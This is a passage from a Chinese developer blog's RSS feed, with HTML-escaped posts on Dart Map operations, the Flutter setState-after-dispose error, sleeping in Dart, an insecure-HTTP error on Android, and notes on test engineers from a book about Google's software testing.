&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
    map12.forEach((&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; key,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; value){
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;key&lt;span style=&#34;color:#e6db74&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;value&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    });
    
&lt;span style=&#34;color:#75715e&#34;&gt;// 遍历时修改value值，PS:遍历时，新增或删除key，都会报错
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;     Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
    map13.forEach((&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; key,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; value){
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;key&lt;span style=&#34;color:#e6db74&#34;&gt;  &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$&lt;/span&gt;value&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        map13[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;;
    });
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e其他&#34;&gt;e.其他&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 遍历每个元素 根据参数函数，对keyvalue做出修改，可转换成其他泛型的Map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map19.map((&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; key,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; value){
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; MapEntry(value, key);
    });

&lt;span style=&#34;color:#75715e&#34;&gt;// 清空map
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
   map15.clear();

&lt;span style=&#34;color:#75715e&#34;&gt;// 整体合并另一个map 泛型要一致
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;   Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
   Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; other &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;};
   map16.addAll(other);&lt;span style=&#34;color:#75715e&#34;&gt;//key相同时value值后者覆盖前者，前者不存在时则添加进来
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 合并两个map 如果key有重复，被合并的map的value覆盖前者
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;};
    map26.addEntries(map27.entries);

&lt;span style=&#34;color:#75715e&#34;&gt;// 存在key就获取值，不存在则添加到map 然后返回值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map18.putIfAbsent(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;, ()&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//存在
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map18.putIfAbsent(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;, ()&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;));&lt;span style=&#34;color:#75715e&#34;&gt;//不存在
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 泛型类型提升为其父祖类
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;};
    Map&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Object&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;Object&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; map22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; map21.cast();
    map22[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—setState 报错</title>
        <link>https://ac-lm.github.io/posts/flutter/fluttersetstate-%E6%8A%A5%E9%94%99/</link>
        <pubDate>Wed, 28 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/fluttersetstate-%E6%8A%A5%E9%94%99/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/9e3bd870d292&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; setState() called after dispose() @Songzh&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1报错&#34;&gt;1.报错&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;ERROR:flutter&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;shell&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;common&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;shell.cc(&lt;span style=&#34;color:#ae81ff&#34;&gt;181&lt;/span&gt;)] Dart Error: Unhandled exception:
setState() called after dispose()&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; _ShelfState&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;b9c1(lifecycle state: defunct, not mounted)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2原因&#34;&gt;2.原因&lt;/h2&gt;
&lt;p&gt;在 Flutter 构件树被销毁后仍然执行了 setState 方法改变页面状态，当 setState 方法改变页面状态时，需要改变的页面被销毁了。使用场景为，当触发 setState 方法时从当前页面切换到其他页面。&lt;/p&gt;
&lt;h2 id=&#34;3解决&#34;&gt;3.解决&lt;/h2&gt;
&lt;p&gt;在 setState 之前加一句判断，判断当前页面是否存在于构件树中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mounted 为 true 表示当前页面挂在到构件树中，为 false 时未挂载当前页面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (mounted) {
  setState(() {
  &lt;span style=&#34;color:#75715e&#34;&gt;// xxxx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  })
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Dart—睡眠</title>
        <link>https://ac-lm.github.io/posts/dart/dart%E7%9D%A1%E7%9C%A0/</link>
        <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/dart/dart%E7%9D%A1%E7%9C%A0/</guid>
        <description>&lt;h2 id=&#34;in-async-code-异步&#34;&gt;In Async Code (异步)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; Future.delayed(Duration(seconds: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;in-sync-code-同步&#34;&gt;In Sync Code (同步)&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dart:io&amp;#39;&lt;/span&gt;;
sleep(Duration(seconds:&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—SDK27 不支持 HTTP 协议</title>
        <link>https://ac-lm.github.io/posts/flutter/fluttersdk27-%E4%B8%8D%E6%94%AF%E6%8C%81-http-%E5%8D%8F%E8%AE%AE/</link>
        <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/fluttersdk27-%E4%B8%8D%E6%94%AF%E6%8C%81-http-%E5%8D%8F%E8%AE%AE/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_44137575/article/details/109045633&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Insecure HTTP is not allowed by platform @csdn &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1报错&#34;&gt;1.报错&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;DioError [DioErrorType.DEFAULT]: Bad state: Insecure HTTP is not allowed by platform
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2原因&#34;&gt;2.原因&lt;/h2&gt;
&lt;p&gt;平台不支持不安全的 HTTP 协议，即不允许访问 HTTP 域名的地址。这是因为 IOS 和 Android 9.0 对网络请求做了一些限制，不能直接访问 HTTP 域名的地址。&lt;/p&gt;
&lt;h2 id=&#34;3解决方案&#34;&gt;3.解决方案&lt;/h2&gt;
&lt;p&gt;降低 SDK 版本至 27 或 27 以下&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Google软件测试之道(3)</title>
        <link>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%933/</link>
        <pubDate>Tue, 27 Apr 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%93/google%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%81%933/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;http://www.51testing.com/html/12/n-853012.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Google软件测试之道  @Whittaker Arb &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;测试工程师&#34;&gt;测试工程师&lt;/h2&gt;
&lt;p&gt;测试工程师（Test Engineer，TE）的工作在于评估软件产品对用户的影响以及整体目标上的风险。因此，当TE进入产品的时候，需要考虑以下一些问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当前软件的薄弱点在哪里？&lt;/li&gt;
&lt;li&gt;有没有安全、隐私、性能、可靠性、可用性、兼容性、全球化和其他方面的问题？&lt;/li&gt;
&lt;li&gt;主要用户场景是否功能正常？对于全世界不同国家的用户都是这样么？&lt;/li&gt;
&lt;li&gt;这个产品能与其他产品（软件和硬件）互操作吗？&lt;/li&gt;
&lt;li&gt;当发生问题的时候，是否容易诊断问题所在？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些东西加起来，构成发布待评估软件的风险概要。TE并不需要自己去解决所有这些问题，但必须保证这些问题被解决掉。TE的根本使命是保护用户和业务的利益，使之不受到糟糕的设计、令人困惑的用户体验、功能bug、安全和隐私等问题的困扰。&lt;/p&gt;
&lt;p&gt;显然，在不同的项目中，TE的工作内容也会有较大的不同。一些TE会在编码方面投入较多的时间，但主要是写中到大型的测试（如端到端的用户场景）而非小型测试。其他一些TE会检查代码和系统设计以确定失效模式，并寻找导致失效的错误路径。在这种情况下，TE可能会去修改代码，但这与从头编写代码是不同的。TE在测试计划及测试完整性上必须更加系统和周密，重点在真实用户的使用方式和系统级别的体验上。TE擅长发现需求中的模糊之处，分析沟通不明确的问题。&lt;/p&gt;
&lt;p&gt;成功的TE游走于这些微妙且敏感的地方，有时候还要与个性很强的开发和产品人员打交道。一旦找到薄弱点，TE就会通过测试使软件出错，然后与开发、产品一起推动解决这些bug。&lt;/p&gt;
&lt;p&gt;TE的工作经常需要去打破常规流程。TE可以在任何时间进入项目，必须迅速评估项目、代码、设计和用户的当前状态，然后决定首要的关注点。如果项目刚刚开始，测试计划是第一优先级。有时，TE在产品后期被拉进来帮助评估项目是否可以发布，或者在beta版本发布之前确认还有哪些主要的问题。当TE进入了一个新被收购的应用或缺少相关应用经验的时候，他们经常会先去做一些不怎么需要计划的探索式测试。有时，项目已经很久没有发布了，只是需要去做一些修饰、安全补丁或界面更新，这需要迥然不同的方法。&lt;/p&gt;
&lt;p&gt;下面是Google关于TE职责的一般性描述。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试计划和风险分析；&lt;/li&gt;
&lt;li&gt;评审需求、设计、代码和测试；&lt;/li&gt;
&lt;li&gt;探索式测试；&lt;/li&gt;
&lt;li&gt;用户场景；&lt;/li&gt;
&lt;li&gt;编写测试用例；&lt;/li&gt;
&lt;li&gt;执行测试用例；&lt;/li&gt;
&lt;li&gt;众包（译注：crowdsourcing，是互联网带来的新的生产组织形式。一个公司或机构把过去由员工执行的工作任务，以自由自愿的形式外包给非特定的（通常是大型的）大众网络的做法）；&lt;/li&gt;
&lt;li&gt;使用统计；&lt;/li&gt;
&lt;li&gt;用户反馈。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;测试计划&#34;&gt;测试计划&lt;/h2&gt;
&lt;p&gt;和测试人员相比，开发人员有一个优势就是他们的工作产物是每个人都真正关心的。开发人员编写代码，构建用户期望的、能为公司赚钱的应用。很明显，代码是项目过程中产生的最重要的文档。然而，测试人员要处理的是真正的文档和其他临时性的事物。在项目的早期阶段，测试人员编写测试计划；然后，他们创建和执行测试用例，编写bug报告；接下来是准备覆盖度报告，收集用户满意度和软件质量数据。在软件成功发布（或失败）之后，很少有人会问及测试产物是什么。如果软件深受人们喜爱，大家就会认为测试所作所为是理所应当的；如果软件很糟糕，人们可能就会质疑测试工作。但其实也没人真正想去了解测试到底做了什么。&lt;/p&gt;
